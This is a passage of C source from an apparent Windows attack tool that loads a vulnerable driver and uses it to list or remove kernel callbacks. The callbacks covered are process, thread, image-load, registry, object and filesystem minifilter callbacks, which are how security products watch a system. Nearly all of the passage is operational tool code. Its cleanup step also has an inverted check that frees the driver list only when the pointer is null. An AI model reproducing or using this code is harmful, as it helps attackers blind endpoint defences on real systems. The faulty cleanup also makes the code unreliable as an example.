	dwPspLoadImageNotifyRoutineArray		= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.pspLoadImageNotifyRoutine;
	dwCallbackListHead						= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.CallbackListHead;
	dwPsProcessType							= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.psProcessType;
	dwPsThreadType							= dwNtoskrnlBaseAddress + g_ntoskrnlOffsets.st.psThreadType;

	dwFltGlobals							= dwfltMgrBaseAddress + g_fltMgrOffsets.st.FltGlobals;

	// Print the base addresses of kernel callbacks
	printf("\n");
	info_t("------------- Address and offset overview -------------")
	info_t("PspCreateProcessNotifyRoutineArray address:     0x%llx", dwPspCreateProcessNotifyRoutineArray);
	info_t("PspCreateThreadNotifyRoutineArray address:      0x%llx", dwPspCreateThreadNotifyRoutineArray);
	info_t("PspLoadImageNotifyRoutineArray address:         0x%llx", dwPspLoadImageNotifyRoutineArray);
	info_t("CallbackListHead address:                       0x%llx", dwCallbackListHead);
	info_t("PsProcessType address:                          0x%llx", dwPsProcessType);
	info_t("PsThreadType address:                           0x%llx", dwPsThreadType);
	info_t("_OBJECT_TYPE.Callbacklist offset:               0x%llx", g_ntoskrnlOffsets.st.object_type_callbacklist);

	info_t("FltGlobals address addres:                      0x%llx", dwFltGlobals);
	info_t("_GLOBALS.FrameList offset:                      0x%llx", g_fltMgrOffsets.st._GLOBALS_FrameList);
	info_t("_FLT_RESOURCE_LIST_HEAD.rList offset:           0x%llx", g_fltMgrOffsets.st._FLT_RESOURCE_LIST_HEAD_rList);

	info_t("_DRIVER_OBJECT.DriverInit offset:               0x%llx", g_fltMgrOffsets.st._DRIVER_OBJECT_DriverInit);
	info_t("_FLTP_FRAME.Links offset:                       0x%llx", g_fltMgrOffsets.st._FLTP_FRAME_Links);
	info_t("_FLTP_FRAME.RegisteredFilters offset:           0x%llx", g_fltMgrOffsets.st._FLTP_FRAME_RegisteredFilters);
	info_t("_FLT_FILTER.DriverObject offset:                0x%llx", g_fltMgrOffsets.st._FLT_FILTER_DriverObject);
	info_t("_FLT_FILTER.InstanceList offset:                0x%llx", g_fltMgrOffsets.st._FLT_FILTER_InstanceList);
	info_t("_FLT_INSTANCE.CallbackNodes offset:             0x%llx", g_fltMgrOffsets.st._FLT_INSTANCE_CallbackNodes);
	info_t("_FLT_INSTANCE.FilterLink offset:                0x%llx", g_fltMgrOffsets.st._FLT_INSTANCE_FilterLink);
	info_t("_FLT_OBJECT.PrimaryLink offset:                 0x%llx", g_fltMgrOffsets.st._FLT_OBJECT_PrimaryLink);


	printf("\n");

	// Open a handle to the vulnerable driver using symbolik link
	hDevice = GetDeviceHandle(g_VULNDRIVERSYMLINK);
	if (hDevice == NULL) {
		error("GetDeviceHandle - Failed");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("GetDeviceHandle - Handle to vulnerable driver 0x%p", hDevice);

	// Enumerate loaded kernel drivers
	if (!ListAndSortKernelDrivers(&pDrivers, &dwDriverCount)) {
		error("ListAndSortKernelDrivers - Failed to enumerate kernel drivers");
		bSTATE = FALSE;
		goto _cleanUp;
	}
	info_t("ListAndSortKernelDrivers - Enumerated %d kernel drivers at 0x%p", dwDriverCount, pDrivers);

	// List and or remove Process Creation kernel callbacks
	printf("\n");
	ListOrRemoveKCArray(hDevice, "Process Creation", dwPspCreateProcessNotifyRoutineArray, pDrivers, dwDriverCount, bRemove);

	// List and or remove Thread Creation kernel callbacks
	printf("\n");
	ListOrRemoveKCArray(hDevice, "Thread Creation", dwPspCreateThreadNotifyRoutineArray, pDrivers, dwDriverCount, bRemove);

	// List and or remove Image Loading kernel callbacks
	printf("\n");
	ListOrRemoveKCArray(hDevice, "Image Loading", dwPspLoadImageNotifyRoutineArray, pDrivers, dwDriverCount, bRemove);

	// List and or remove Registry kernel callbacks
	printf("\n");
	ListOrRemoveKCRegistryOperations(hDevice, "Registry Operations", dwCallbackListHead, pDrivers, dwDriverCount, bRemove);

	// List and or remove Object Operations kernel callbacks for process
	printf("\n");
	ListOrRemoveKCObjectOperations(hDevice, "Process Object Operations", dwPsProcessType, pDrivers, dwDriverCount, bRemove);
	
	// List and or remove Object Operations kernel callbacks for threads
	printf("\n");
	ListOrRemoveKCObjectOperations(hDevice, "Thread Object Operations", dwPsThreadType, pDrivers, dwDriverCount, bRemove);

	// List and remove Mini Filter kernel callbacks
	printf("\n");
	ListOrRemoveMiniFiltersCallbacks(hDevice, "Minifilters", dwFltGlobals, pDrivers, dwDriverCount, bRemove);
	printf("\n");

_cleanUp:

	// Close handle to device
	if (hDevice) {
		CloseHandle(hDevice);
	}

	// Cleanup driver list
	if (!pDrivers) {
		HeapFree(GetProcessHeap(), 0, pDrivers);
	}

	return bSTATE;

}